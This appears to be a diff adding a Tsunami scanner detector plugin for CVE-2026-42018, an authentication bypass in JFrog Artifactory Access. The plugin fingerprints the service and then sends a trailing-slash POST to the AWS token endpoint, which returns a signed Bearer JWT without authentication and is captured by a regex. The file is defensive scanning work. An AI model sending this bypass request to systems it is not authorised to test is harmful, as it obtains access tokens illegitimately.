@@ -1,0 +1,138 @@
+# proto-file: github.com/google/tsunami-security-scanner-plugins/templated/templateddetector/proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "JFrogArtifactory_CVE_2026_42018"
+  author: "Google"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2026-42018"
+  }
+  severity: HIGH
+  title: "JFrog Artifactory Access AWS Token Endpoint Trailing-Slash Authentication Bypass (CVE-2026-42018)"
+  description: "JFrog Artifactory (bundled JFrog Access service) prior to 7.146.8 contains a URL path normalization discrepancy in its authentication filter for /access/api/v1/aws/token. While POST requests to /access/api/v1/aws/token enforce authentication and return HTTP 401, appending a trailing slash (/access/api/v1/aws/token/) bypasses the security filter and causes Access to issue a signed Bearer JWT without authentication."
+  recommendation: "Upgrade JFrog Artifactory to version 7.146.8 or later (or the corresponding fixed release for your branch), and block unauthenticated external access to /access/api/v1/aws/token* at the reverse proxy if immediate upgrading is not possible."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2026-42018"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_jfrog_access"
+  action_phase: ACTION_PHASE_FINGERPRINT
+  http_request: {
+    method: GET
+    uri: [
+      "/access/api/v1/system/ping",
+      "/artifactory/access/api/v1/system/ping"
+    ]
+    client_options: {
+      disable_follow_redirects: true
+    }
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "OK" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "verify_canonical_aws_token_requires_auth"
+  action_phase: ACTION_PHASE_DETECTION
+  http_request: {
+    method: POST
+    uri: [
+      "/access/api/v1/aws/token",
+      "/artifactory/access/api/v1/aws/token"
+    ]
+    headers: [
+      { name: "Accept" value: "application/json" },
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{}"
+    client_options: {
+      disable_follow_redirects: true
+    }
+    response: {
+      http_status: 401
+      expect_all: {
+        conditions: [
+          { body: {} contains: "\"errors\"" },
+          { body: {} contains: "UNAUTHORIZED" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "verify_trailing_slash_mints_jwt"
+  action_phase: ACTION_PHASE_DETECTION
+  http_request: {
+    method: POST
+    uri: [
+      "/access/api/v1/aws/token/",
+      "/artifactory/access/api/v1/aws/token/"
+    ]
+    headers: [
+      { name: "Accept" value: "application/json" },
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{}"
+    client_options: {
+      disable_follow_redirects: true
+    }
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "\"access_token\"" },
+          { body: {} contains: "\"token_type\"" },
+          { body: {} contains: "\"Bearer\"" },
+          { body: {} contains: "\"scope\"" }
+        ]
+      }
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "\"access_token\"\\s*:\\s*\"(eyJ[A-Za-z0-9_-]+\\.eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+)\""
+            variable_name: "ISSUED_JWT"
+          }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "fingerprint_jfrog_access",
+    "verify_canonical_aws_token_requires_auth",
+    "verify_trailing_slash_mints_jwt"
+  ]
+}
